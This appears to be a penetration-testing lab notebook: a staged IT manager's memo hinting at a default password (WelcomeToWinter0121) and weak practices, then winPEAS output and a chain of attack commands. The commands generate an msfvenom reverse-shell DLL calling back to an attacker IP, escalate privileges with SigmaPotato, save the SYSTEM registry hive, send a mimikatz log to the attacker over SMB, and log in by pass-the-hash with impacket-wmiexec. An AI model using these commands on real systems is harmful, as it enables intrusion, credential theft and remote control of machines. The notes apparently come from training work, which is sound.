---
IP_KALI: 192.168.45.155
---
Passwordless????? Zero trust????????
Fearless transparent nothing to hide. Check
microchip shortage - call DevOps/IT?
Get rental confirmation receipt from Handy
Where are provisioning scripts stored? Passwords should be hashed on them???
MS.17 010? MS 08-067? Phase out XP OT boxes within the year.
Board wants us to change all passwords every 10 days for security? Roll out by end of Q2
TODO: remove certutil.exe - being used by APTs (NGOs??)
15.20 for lunch, my split, burgr from intern jim - maybe payroll/hr ask them
who's responsible for Jenkins? ask Alex after holiday
IN PROGRESS: move all internal backup services to not run as SYSTEM
Default password for new resets will be WelcomeToWinter0121
Alex's password expired, but he's on holiday for the next 4 weeks. Password reset by IT to the default
PTO being phased out - HR being replaced with SaaS?
new directive: Security team is being outsourced end of Q3. Look on freelancer?
"In the midst of chaos, there is also opportunity." - Sun Tzu. look this up
remember to bring PDFs to the board meeting
security are mentioning domain administrator (??) compromise - look into it next week
Apparently they have SSH for Windows now? Remove netcat hack when ssh is working
Fall (autumn?), Winter, end of the year - Accounts???
Point by point refutation statements

```
←[1;36m╔══════════╣ ←[1;32mSearching executable files in non-default folders with write (equivalent) permissions (can be slow)←[0m                                                                                                                             File Permissions "C:\Users\alex\Desktop\winPEASany.exe": alex [AllAccess]                                                    File Permissions "C:\Users\alex\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": alex [AllAccess]            File Permissions "C:\Users\alex\AppData\Local\Microsoft\OneDrive\OneDrive.exe": alex [AllAccess]                             File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\wt.exe": alex [AllAccess]                                File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\winget.exe": alex [AllAccess]                            File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\SnippingTool.exe": alex [AllAccess]                      File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\python3.exe": alex [AllAccess]                           File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\python.exe": alex [AllAccess]                            File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\pbrush.exe": alex [AllAccess]                            File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\notepad.exe": alex [AllAccess]                           File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\msteams_autostarter.exe": alex [AllAccess]               File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\msteamsupdate.exe": alex [AllAccess]                     File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\msteams.exe": alex [AllAccess]                           File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\mspaint.exe": alex [AllAccess]                           File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": alex [AllAccess]                     File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": alex [AllAccess]           File Permissions "C:\Users\alex\AppData\Local\Microsoft\WindowsApps\MicrosoftTeams_8wekyb3d8bbwe\msteams_autostarter.exe": alex [AllAccess] 
```

msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.213 LPORT=443 -f dll -o EnterpriseServiceOptional.dll

copy SigmaPotato.exe C:\Users\enterpriseuser\SigmaPotato.exe

Set-LocalUser -Name $env:enterpriseuser -Password (Read-Host -AsSecureString "Enter new password:")

reg save hklm\system C:\Users\enterpriseuser\system

net use m:  \\192.168.45.213\test /USER:kali kali copy mimikatz.log m:\

192.168.45.213

net use m: \\192.168.45.213\test /user:kourosh kourosh copy mimikatz.log m:\

/usr/bin/impacket-wmiexec -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 enterpriseadmin@192.168.164.222